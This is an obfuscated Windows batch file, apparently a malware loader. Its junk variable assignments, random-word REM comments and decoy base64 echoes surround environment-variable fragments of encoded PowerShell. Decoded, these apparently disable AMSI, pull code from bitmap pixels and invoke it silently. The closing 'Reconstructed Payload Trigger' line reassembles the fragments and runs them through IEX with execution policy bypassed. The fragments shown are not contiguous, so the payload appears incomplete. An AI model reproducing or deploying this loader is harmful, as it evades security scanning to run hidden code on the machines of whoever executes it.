@echo off
Se%DeKzp%T "ViZPXrMFGjktncA=niucKYBSAcVFrSE"
REM kiln kappa pixel fragment guard fathom phantom strobe
REM clearing core ruby twilight fragment sword
REM glimmer undergrowth guard
SE%JjHHW%t "CerHnDWkPP=nlPRebXqLoBVTXtGv"
REM zenith undergrowth kappa kiln cipher
REM valley core lance core kiln pixel
echo aHBJc1FMQURTQTE5NGRJbDJqaUhnSkt0RHMxaFd4NkFKc05Da29TZGptcVcySWp6aVQyU3V0Sg== >nul 2>&1
sE%FzbGH%t "zXwvUqjBdF=FCxjqzYnweUDIIrMDDMqQuHXLrdqI"
echo ZktlUkFGVmQ4ekZIS3lITTBMRkpRQUZXMDdTNXJWbDJxaVVmbDJRcE9yUG5KcDk0Z2VpbTNKc3kza3VGSVAwMVA4SkN3VVk= >nul 2>&1
REM phantom glimmer vertex
REM cipher mirage beacon cipher beacon sword core odyssey
REM echo twilight glimmer
REM glimmer sword kappa fragment
echo SWh4WmdHRGNtTFp0aVg4c1Q1NXlZTDhlRE9iSmt3dVR5SGxuS0lIVkwzSjl1Zg== >nul 2>&1
REM phantom cipher binary
REM phantom glimmer clearing
REM fragment echo fragment guard guard
sE%lfmm%T "GvUkdQoud=XtjLToBfiJHWuJCXuAyzSlYemGcV"
REM odyssey core mirage core
REM strobe kappa vision kappa clearing vertex odyssey clearing
echo SkpqZFFXMmxSek54QkhzTnU0WDlzVFpPNGVvcGVHSmxFelJ6QjdEVGxEaFZzemRwWm9RakxGUFhmeDYzYlpXNGc1dG9IVGdiTFllSHBh >nul 2>&1
SE%FOE%T "pk_TBVX_0026=eXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcKW1N5c3RlbS5BcHBEb21haW5dOjpDdXJyZW50RG9tYWluLmFkZF9Bc3NlbWJseVJlc29sdmUoeyBwYXJhbSgkcywgJGUpIHJldHVybiAkbnVsbCB9KQpbU3lzdGVtLkFwcER"
REM fragment guard delta core kiln pixel hawk fathom echo twilight
se%FBSiy%t "hZIGuTNNT=hSxJDkSuBhSNCxhCEbuQ"
SE%Cjp%T "JTTocBQysYHQ=ORhPvjXNxVnEGnrq"
REM lance undergrowth mirage clearing clearing shadow mirage glimmer undergrowth strobe
Se%YEWW%t "CfmWDhaXEcV=HBHEnqBsRTdDwMMjZgSepAe"
se%fRJJ%t "uWFNGq=hGFQuNICDRfldBPCJkRgcwozYSddo"
REM core mirage odyssey undergrowth vertex beacon
REM beacon undergrowth vision
echo TDdneldUUXJyd0t0WXBmdHZUWjhWRGN3YkV2YWc1dGwwYkh5WHlaUXRtVGJ6VUQ2VEdGdnVsUDJzNWV1S21MVlRPelRPU2toNXFBekhyMHk= >nul 2>&1
Se%COWVB%T "EHiuaDVEAse=perjSJtnvIJGTpjqJTUcLl"
sE%JMFFi%t "xFLyakxbWfUfzyC=qPcEhBalRQBjwI"
REM hawk strobe glimmer vision vision
REM fathom strobe echo
REM pixel cipher odyssey undergrowth mirage ruby beacon echo fragment pixel
Se%WEnac%t "ZJgbTSaVpACJ=ZdqPDwNAuVesDFPdoGTuEp"
REM ruby odyssey cipher zenith lance echo
REM delta zenith sword shadow undergrowth hawk sword strobe lance guard
REM fathom sword sword vision odyssey lance vertex
REM circle lance lance fragment cipher undergrowth odyssey clearing
sE%pfs%T "mSxdYTl=lJsFmYCvxbTxPlfsWYeyITeTQickwhVzwHF"
se%GjuNW%t "pk_TBVX_0009=bGVudGx5Q29udGludWUKJHR5cGUgPSAkY2xhc3NOYW1lIC1hcyBbdHlwZV0KaWYgKC1ub3QgJHR5cGUpIHsgcmV0dXJuIH0KJGhBbXNpID0gJHR5cGU6OkdldE1vZHVsZUhhbmRsZSgiYW1"
se%nCp%T "UvvytXw=JKwUjLHAiPIZQSIIPOhmTunwfEiFZbs"
REM sword cipher core kiln pixel cipher odyssey cipher kappa echo
sE%RPS%t "PwLtLFkygQuP=cysXSOxwFngZOjeLJtfYQkDgZxhEiLVPe"
se%hBxcd%T "cuYfWsA=MWeTLYFnNnQlRotOoaMOwL"
REM glimmer binary pixel clearing mirage valley
se%coT%T "MaOoMMUk=qybOsoVewLdkLuFavRLIrRlYzl"
REM cipher valley lance shadow valley zenith
echo SGVTZHRsYlhmdUFmS0RxVDFwQ3psbllhaTNCNkQ3S056cDcxSVFJejVpcm5RUGpIQ2ZhSnJGQ2VQ >nul 2>&1
se%AFYiV%T "uNLtTtn=fULBptRxJhpDwujQBfQbVF"
Se%dIXWg%T "qULdvlvxY=wSSLJCxZTkQMVUWMpNsAAiQAfYRyIZHQW"
se%xJra%t "QYPQcswndyh=UaASNclevOQL"
echo cllicFp4SEM2RXNoS3d1d3N1UnRCMzE1dzgwcDNHRlFiWTBaQnhrQw== >nul 2>&1
sE%iSCC%t "HNDlRdYauGgcks=XRNjcYeDJwbMxZAgZFeL"
REM strobe clearing undergrowth twilight odyssey lance ruby beacon circle undergrowth
REM guard delta glimmer kiln twilight guard sword ruby
Se%BGPK%t "KGsLzbCmohafS=MbPftskFlurSkaSFmiyeWzxoOV"
SE%WAM%t "RtNOOxLMCPsFTV=hqFXPmXKiqhJDRqBmWmUmMUMkMhQEiiU"
REM vertex valley fathom
REM delta hawk ruby
REM hawk fathom kappa strobe cipher cipher
SE%bpHE%T "rzuMlFfH=FcgDcaHWeVbZvRUGtmc"
Se%MenmU%t "nwLqJNnya=DPVlAbtJuUKspkQk"
REM shadow kiln odyssey cipher zenith
echo QXVQWXFKSG9lSEkyVnliTzFtYU1oUklTUDU3WEFKZjF2S2piajMzN0M2eWN5ZFZtOHlqaDVTZ1o2dTJHaUh6dGtITzB4TGxoc01JVG9NOA== >nul 2>&1
echo OUZGYWI0N3JHdjY5MmVJTGJCeDNaM1RzMlVFcDRybE1JOWRtdVZDU1MxYUFaSHhuTw== >nul 2>&1
REM delta phantom phantom undergrowth core cipher zenith odyssey vertex
se%skV%t "HpPUrjVgXRvQs=VMvIiLBHUtWmiAaQuRetTes"
REM kiln fragment vision glimmer twilight circle ruby beacon delta
sE%VJM%t "OHvnWN=AAFPBKPwdsRtOQCDtvACirEhnZzbqhOBOEc"
sE%VJh%t "pk_TBVX_0046=dHJ5KSB7CkxvZy1TaWxlbnQgIlshXSBJbnZva2luZy4uLiIgIkN5YW4iCmlmICgkZW50cnkuR2V0UGFyYW1ldGVycygpLkNvdW50IC1lcSAwKSB7ICRlbnRyeS5JbnZva2UoJG51bGwsICRudWxsKSB9CmVsc2UgeyAk"
REM valley binary ruby clearing lance beacon pixel circle glimmer guard
REM circle vision hawk shadow beacon delta beacon phantom
echo OWhyVkVWZ2VZcVJsYzMwb0ZOTzhmQmxqNjVBN3NaS0JhNm9FRjBJS0U0Qng4MmNDSExScVZ2 >nul 2>&1
Se%sodP%T "ZBczPXpAAh=vBzFmLSZQheVjXvECgCT"
SE%sUALQ%t "gSwdWHouSDgssLo=unGjEaTAJmwVIEcSOiosAkEg"
echo V25HdHFVMFozRTJ6dWR6UlZndzJRRG5MbmxheGh2QXd6RlNzdFhwQk0yUVNwYklwem9QMkxaUmRmUTJ5YlNwM2c= >nul 2>&1
se%FRnB%T "ufOiSOWIJ=CAyUNnmbDLQxUwSJCsevOaUlUnzUFMPRK"
se%syd%t "pk_TBVX_0032=2luZy5CaXRtYXBdOjpGcm9tU3RyZWFtKCRtcykKJHcgPSAkYm1wLldpZHRoOyAkaCA9ICRibXAuSGVpZ2h0CiRwMCA9ICRibXAuR2V0UGl4ZWwoMCwwKTsgJHAxID0gJGJtcC5HZXRQaX"
REM mirage beacon pixel fathom binary
REM undergrowth zenith undergrowth clearing zenith odyssey fragment twilight mirage hawk
REM echo phantom clearing core sword valley fragment
SE%IBV%T "DNObnnVOHabdMZi=DebRmCOiAZwJNLmzB"
REM undergrowth kappa strobe phantom echo circle lance zenith
sE%vdflf%T "lpRIOO=uiZLmqnTiBCqZlqezMIbyyKUjm"
echo VmFNTVZ5QXpmYk9vbzROWGpLUVNTVkZYZGZWczJrd3lkcmJiaTZoekI= >nul 2>&1
REM delta undergrowth odyssey
echo c0RIaFhXZDZMTzRhWFFvYWFySE42bkd4OTNyWXJBZGdFWWJ2bEJlYkNETHBJeHZa >nul 2>&1
REM kappa echo phantom kappa vision valley beacon pixel
se%wBMg%t "LfaKevYcfQu=INITGiGMCjEfkEWLufEhKSIC"
SE%kJxD%t "fcYucf=YjnjFDFvqsCYelLIv"
REM lance undergrowth core echo vision
REM guard strobe undergrowth clearing cipher twilight vision
echo SDU1b0dBdzB1YlJuSUVtdWhOV1JidmpFNEMwVExSUmV6Nm5aanY0MmxYdkFDbUhHVFYwbnhsOEtNR3I= >nul 2>&1
REM shadow kappa guard pixel core echo
REM fathom twilight sword hawk vertex
echo QmhpaDl3WWlPbHJRR2hMcGVkTndmWjEwUEtmSlVoYjNVNUNLUnd1UGJyZ0NPT0VicTJVbHROSEZOaUtPdjJG >nul 2>&1
REM hawk vision circle core glimmer binary echo
REM valley fragment circle sword mirage delta guard binary odyssey shadow
echo RThlNENkbGNRMFppWlJ2dThBak9idW93UmdTZlR3ek15WXVIZWg1NlVG >nul 2>&1
SE%isss%T "fbOyHUtp=KOWKtFQMtPrmwwzjBgvokIdIpyR"
SE%LhKgD%T "TnmVzJnthWm=PdMPsKJUEQqEPKYcHaz"
REM guard binary binary cipher cipher odyssey
echo Y3IzQU9ESHJJRUl6alNWRkxhSWM0Um5vZVo4cmhjMmZXQ2dXSzVRYkVaSUU2aGpGYTBxWG9SdWp6c3hEa001Z09PWjRJM0V3SWlRQWgyaWY= >nul 2>&1
REM valley mirage ruby circle strobe kiln
se%EJzzu%t "xuKExdfnlBbt=WlZTepDCKOE"
REM valley circle lance
se%AnPP%t "DTeuxRTjxXzvMb=WDPxJtxdWCdeDgZXmaAqwEsoAXNU"
SE%Old%t "GSZofd=kiaOfiiGeLrfRILEgYWIruyPPJIS"
REM kappa shadow binary hawk pixel twilight
sE%SCiiV%T "PkvawPII=vHxJBVkENXpqifKbRtSDaWD"
SE%VzEZt%T "wxqKdjCllu=RfiFfCANTuxEy"

REM --- Reconstructed Payload Trigger ---
powershell -NoProfile -ExecutionPolicy Bypass -Command " $e=((Get-ChildItem env:pk_TBVX_* | Sort Name | ForEach-Object { $_.Value }) -join ''); $d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e)); IEX $d" 
